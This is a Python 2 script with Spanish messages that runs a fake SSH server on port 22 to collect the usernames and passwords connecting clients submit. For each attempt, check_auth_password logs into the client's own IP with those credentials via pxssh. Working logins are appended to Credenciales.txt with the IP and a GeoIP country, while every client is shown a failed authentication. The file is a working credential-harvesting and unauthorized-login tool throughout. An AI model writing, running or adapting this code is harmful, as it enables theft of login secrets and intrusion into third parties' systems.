import base64
from binascii import hexlify
import os
import socket
import sys
import threading
import traceback
from pexpect import pxssh
from geoip import geolite2

import paramiko
from paramiko.py3compat import b, u, decodebytes


paramiko.util.log_to_file('demo_server.log')

host_key = paramiko.RSAKey(filename='test_rsa.key')


class Server (paramiko.ServerInterface):


    def __init__(self):
        self.event = threading.Event()

    def check_auth_password(self, username, password):
        try:
            connectSSH = pxssh.pxssh()
            ip, port = addr
            connectSSH.login(ip, username, password)
            print("Credenciales conseguidas")
            country = "Unknown"
            try:
                match = geolite2.lookup(ip)
                country = match.country
            except:
                pass
            f = open("Credenciales.txt", "a")
            f.write("IP: " + ip + " User: " + username + " Pass: " + password + " Country: " + country + "\n")
            f.close()
            connectSSH.logout()
            return paramiko.AUTH_FAILED
        except pxssh.ExceptionPxssh, e:
            return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username):
        return 'password'


# Conexion
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('', 22))
except Exception as e:
    print('Fallo en el enlace con el puerto: ' + str(e))
    traceback.print_exc()
    sys.exit(1)

while True:
    try:
        sock.listen(100)
        print('Esperando una conexion...\n')
        client, addr = sock.accept()
    except Exception as e:
        print('Fallo al crear el socket: ' + str(e))
        traceback.print_exc()
        sys.exit(1)

    print('Hay una conexion')

    try:
        t = paramiko.Transport(client)
        t.add_server_key(host_key)
        server = Server()
        try:
            t.start_server(server=server)
        except paramiko.SSHException:
            print('Fallo en la negociacion SSH')
            sys.exit(1)

        chan = t.accept(20)
        print('Fin de la conexion\n')

    except Exception as e:
        print('Ha ocurrido una excepcion: ' + str(e.__class__) + ': ' + str(e))
        traceback.print_exc()
        try:
            t.close()
        except:
            pass
        sys.exit(1)